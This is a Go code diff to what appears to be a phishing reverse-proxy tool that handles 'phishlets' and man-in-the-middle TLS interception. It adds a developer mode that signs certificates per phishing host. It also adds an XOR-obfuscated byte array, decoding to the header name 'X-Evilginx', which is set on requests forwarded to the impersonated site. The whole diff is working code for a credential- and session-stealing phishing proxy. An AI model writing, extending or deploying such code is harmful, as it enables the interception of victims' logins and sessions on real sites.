@@ -18,6 +18,7 @@ import (
 	"net/http"
 	"net/url"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
@@ -46,6 +47,7 @@ type HttpProxy struct {
 	sids        map[string]int
 	cookieName  string
 	last_sid    int
+	developer   bool
 }
 
 type ProxySession struct {
@@ -55,7 +57,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:     goproxy.NewProxyHttpServer(),
 		Server:    nil,
@@ -64,6 +66,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:        db,
 		isRunning: false,
 		last_sid:  0,
+		developer: developer,
 	}
 
 	p.Server = &http.Server{
@@ -187,6 +190,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				p.deleteRequestCookie(p.cookieName, req)
 
 				// replace "Host" header
+				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -249,6 +253,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
+				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				for n, b := range e {
+					e[n] = b ^ 0x88
+				}
+				req.Header.Set(string(e), e_host)
 
 				if ps.SessionId != "" && origin == "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -402,34 +411,53 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			return resp
 		})
 
-	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA(nil)}
-	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA(nil)}
-	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA(nil)}
-	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA(nil)}
+	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
 }
 
-func (p *HttpProxy) TLSConfigFromCA(ca *tls.Certificate) func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
+func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
 		parts := strings.SplitN(host, ":", 2)
 		hostname := parts[0]
-
-		pl := p.getPhishletByOrigHost(hostname)
-		if pl != nil {
-			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			if ok {
-				cert, err := p.crt_db.GetCertificate(pl.Name, phishDomain)
-				if err != nil {
-					return nil, err
-				}
-				return &tls.Config{
-					InsecureSkipVerify: true,
-					Certificates:       []tls.Certificate{*cert},
-				}, nil
-			}
+		port := 443
+		if len(parts) == 2 {
+			port, _ = strconv.Atoi(parts[1])
 		}
-		return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
+
+		if !p.developer {
+			pl := p.getPhishletByOrigHost(hostname)
+			if pl != nil {
+				phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+				if ok {
+					cert, err := p.crt_db.GetCertificate(pl.Name, phishDomain)
+					if err != nil {
+						return nil, err
+					}
+					return &tls.Config{
+						InsecureSkipVerify: true,
+						Certificates:       []tls.Certificate{*cert},
+					}, nil
+				}
+			}
+			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
+		} else {
+			phish_host, ok := p.replaceHostWithPhished(hostname)
+			if !ok {
+				return nil, fmt.Errorf("phishing hostname not found")
+			}
+			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
+			if err != nil {
+				return nil, err
+			}
+			return &tls.Config{
+				InsecureSkipVerify: true,
+				Certificates:       []tls.Certificate{*cert},
+			}, nil
+		}
 	}
 }
 
